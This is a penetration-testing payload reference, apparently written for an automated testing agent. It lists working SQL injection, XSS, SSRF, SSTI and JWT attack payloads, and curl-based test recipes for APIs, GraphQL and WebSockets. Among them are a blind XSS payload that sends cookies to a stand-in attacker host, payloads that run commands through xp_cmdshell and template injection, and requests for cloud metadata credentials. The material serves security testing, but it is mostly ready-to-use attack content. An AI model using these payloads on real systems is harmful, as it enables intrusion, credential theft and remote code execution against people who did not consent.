## PAYLOAD REFERENCE LIBRARY (BAKED-IN — OFFLINE)

### SQL Injection
```
Error-based (basic):
'  "  `  ')  "))  `)`
' OR 1=1--   ' OR 1=1#   ' OR '1'='1
admin'--   ' OR 1=1 LIMIT 1--

Union-based (find column count first):
' ORDER BY 1--   ' ORDER BY 2--  (until error = column count)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

MySQL:
' UNION SELECT @@version,null--
' AND SLEEP(5)--
' UNION SELECT LOAD_FILE('/etc/passwd'),null--

PostgreSQL:
'; SELECT pg_sleep(5)--
'; COPY (SELECT '') TO PROGRAM 'id'--

MSSQL:
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
'; WAITFOR DELAY '0:0:5'--

Auth bypass:
' OR 1=1--   admin'--   ' OR 'x'='x
```

### XSS Payloads
```
Basic:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details/open/ontoggle=confirm(1)>

Filter bypass (case, encoding, nested):
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</script>
&#60;script&#62;alert(1)&#60;/script&#62;
<img src=x onerror=eval(atob("YWxlcnQoMSk="))>
javascript:alert(1)

Blind XSS (cookie exfil):
<img src=x onerror="fetch('https://ATTACKER.COM/?c='+document.cookie)">
"><script src=//ATTACKER.COM/x.js></script>

DOM-based sinks: document.write(), innerHTML, eval(), location.href, document.URL
```

### SSRF Payloads
```
Localhost bypass variants:
http://127.0.0.1        http://[::1]
http://0177.0.0.1       http://2130706433
http://0x7f000001       http://127.1

Cloud metadata:
AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP:   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01

Protocol handlers:
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:6379/INFO
```

### SSTI Detection + Exploitation
```
Detection polyglot (triggers error if SSTI present):
${{<%[%'"}}%\

Engine identification:
{{7*7}}       -> 49  = Jinja2 or Twig
${7*7}        -> 49  = FreeMarker/Velocity
{{7*'7'}}     -> 7777777 = Jinja2 (Twig returns 49)

Jinja2 RCE:
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}

Twig RCE:
{{['id']|map('system')}}

FreeMarker RCE:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### JWT Attacks
```
None algorithm:
- Change header alg to "none" (or "None"/"NONE"/"nOnE")
- Remove signature (keep trailing dot): header.payload.

Algorithm confusion RS256 to HS256:
1. Get public key from /.well-known/jwks.json or /api/auth/public-key
2. Change alg to HS256 in header
3. Sign with RSA public key as HMAC secret

KID injection:
{"alg":"HS256","kid":"../../../../../../dev/null"} -> sign with empty string
{"alg":"HS256","kid":"' UNION SELECT 'secret'--"} -> SQLi in KID

Weak secret brute force:
hashcat -a 0 -m 16500 JWT_TOKEN /usr/share/wordlists/rockyou.txt
```

#### OWASP API Security Top 10 (2023) — API-Specific Testing

When target exposes a REST or GraphQL API, run this checklist in addition to standard web testing.

**API1:2023 — Broken Object Level Authorization (BOLA/IDOR)**
```bash
# Enumerate object IDs — try sequential IDs with other user's token
curl -s "https://TARGET/api/v1/orders/1001" -H "Authorization: Bearer USER_A_TOKEN"
curl -s "https://TARGET/api/v1/orders/1002" -H "Authorization: Bearer USER_A_TOKEN"  # Should 403

# UUID prediction — if UUIDs used, check if v1 (time-based, predictable)
curl -s "https://TARGET/api/v1/users/550e8400-e29b-41d4-a716-446655440000"

# Indirect object reference via filter params
curl -s "https://TARGET/api/v1/invoices?user_id=2" -H "Authorization: Bearer USER_1_TOKEN"
```

**API2:2023 — Broken Authentication**
```bash
# Token in URL (logged in server logs)
curl -s "https://TARGET/api/data?token=JWT_HERE"

# Weak token rotation — get new token, old token still valid?
# Step 1: Get new token via refresh
curl -s -X POST "https://TARGET/api/auth/refresh" -d '{"refresh":"OLD_REFRESH_TOKEN"}'
# Step 2: Try old access token — should be invalidated
curl -s "https://TARGET/api/me" -H "Authorization: Bearer OLD_ACCESS_TOKEN"

# API key in header vs body — try both
curl -s "https://TARGET/api/data" -H "X-API-Key: KEY"
curl -s "https://TARGET/api/data" -d '{"api_key":"KEY"}'
```

**API3:2023 — Broken Object Property Level Authorization**
```bash
# Mass assignment — try to set privileged properties
curl -s -X PUT "https://TARGET/api/v1/users/me" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"email":"me@test.com","role":"admin","is_verified":true,"balance":99999,"internal_id":1}'

# Excessive data exposure — does GET /api/users/:id return internal fields?
curl -s "https://TARGET/api/v1/users/me" -H "Authorization: Bearer USER_TOKEN" | python3 -m json.tool
# Look for: password_hash, internal_notes, admin_flag, stripe_customer_id, etc.
```

**API4:2023 — Unrestricted Resource Consumption**
```bash
# No pagination limit
curl -s "https://TARGET/api/v1/products?page=1&limit=999999" -H "Authorization: Bearer TOKEN"

# Expensive regex / search DoS
curl -s "https://TARGET/api/v1/search?q=$(python3 -c "print('a'*10000)")" -H "Authorization: Bearer TOKEN" -o /dev/null -w "%{time_total}s\n"

# File upload size abuse
dd if=/dev/zero bs=1M count=100 | curl -s -X POST "https://TARGET/api/upload" \
  -H "Authorization: Bearer TOKEN" -F "file=@/dev/stdin" -o /dev/null -w "%{http_code}\n"
```

**API5:2023 — Broken Function Level Authorization**
```bash
# Admin endpoints with user token
for path in /api/admin /api/v1/admin /api/management /api/internal /api/debug /api/config; do
  echo -n "$path: "
  curl -s -o /dev/null -w "%{http_code}" "https://TARGET$path" -H "Authorization: Bearer USER_TOKEN"
  echo
done

# HTTP method switching
curl -s -X DELETE "https://TARGET/api/v1/users/2" -H "Authorization: Bearer USER_TOKEN"
curl -s -X PUT "https://TARGET/api/v1/admin/settings" -H "Authorization: Bearer USER_TOKEN" -d '{}'
```

**API6-8:2023 — Server Side Request Forgery, Security Misconfiguration, Improper Asset Management**
```bash
# SSRF via webhook/callback URL
curl -s -X POST "https://TARGET/api/webhooks" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' \
  -H "Authorization: Bearer TOKEN"

# Exposed API documentation (asset management)
for path in /swagger.json /swagger-ui.html /openapi.json /api-docs /redoc /graphql /playground; do
  echo -n "$path: "
  curl -s -o /dev/null -w "%{http_code}" "https://TARGET$path"
  echo
done

# Old API version still accessible
curl -s "https://TARGET/api/v0/users" -H "Authorization: Bearer TOKEN"
curl -s "https://TARGET/api/v1/users" -H "Authorization: Bearer TOKEN"
```

**API9-10:2023 — Improper Inventory + Unsafe Consumption of APIs**
```bash
# Third-party injection via API aggregation
curl -s -X POST "https://TARGET/api/translate" \
  -d '{"text":"<script>alert(1)</script>","lang":"fr"}' \
  -H "Authorization: Bearer TOKEN"
```

#### GraphQL Security Testing
When target exposes a GraphQL endpoint (`/graphql`, `/gql`, `/api/graphql`):

```bash
# Introspection — enumerate the full schema
curl -s -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' \
  | python3 -m json.tool > evidence/recon/graphql-schema.json

# If introspection is disabled, try field suggestion
curl -s -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { passwor } }"}'
# GraphQL will suggest "password" if it exists

# Batch query abuse (DoS / rate limit bypass)
curl -s -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"}]'

# Circular query (DoS — infinite depth)
curl -s -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { friends { friends { friends { friends { name } } } } } }"}' \
  -o /dev/null -w "%{time_total}s\n"

# IDOR via GraphQL
curl -s -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"{ user(id: 2) { email password role } }"}'

# SQL injection in GraphQL args
curl -s -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(name: \"admin\\\") { id } }"}'

# Mutation privilege escalation
curl -s -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"mutation { updateUser(id: 1, role: \"admin\") { id role } }"}'
```

#### WebSocket Security Testing
When target uses WebSocket (`wss://`, `ws://`, or Upgrade: websocket headers):

```bash
# Detect WebSocket endpoints
playwright-cli open https://TARGET --headless
playwright-cli evaluate "
  const ws = [];
  const origWS = window.WebSocket;
  window.WebSocket = function(...args) {
    ws.push(args[0]);
    return new origWS(...args);
  };
  JSON.stringify(ws)
"

# Check WebSocket origin validation
# Use wscat (install: npm install -g wscat)
docker exec kali-pentest bash -c "
  npm install -g wscat 2>/dev/null
  echo 'test payload' | timeout 5 wscat -c 'wss://TARGET/ws' \
    -H 'Origin: https://evil.com' 2>&1 | head -20
" > evidence/recon/websocket-origin.txt

# CSRF via WebSocket (no CSRF token on handshake)
playwright-cli open https://TARGET --headless
playwright-cli evaluate "
  const ws = new WebSocket('wss://TARGET/ws');
  ws.onopen = () => ws.send(JSON.stringify({action:'sensitive_action',data:'test'}));
  ws.onmessage = (e) => console.log(e.data);
"

# Message injection — try standard injection payloads via WebSocket
docker exec kali-pentest bash -c "
  echo '{\"message\":\"<script>alert(1)<\\/script>\"}' | \
  timeout 5 wscat -c 'wss://TARGET/ws' 2>&1
" > evidence/logs/websocket-xss.txt

# Replay attack — capture and replay authenticated message
# Capture: playwright-cli network-requests (after auth flow)
# Then replay captured frames with different user token
```
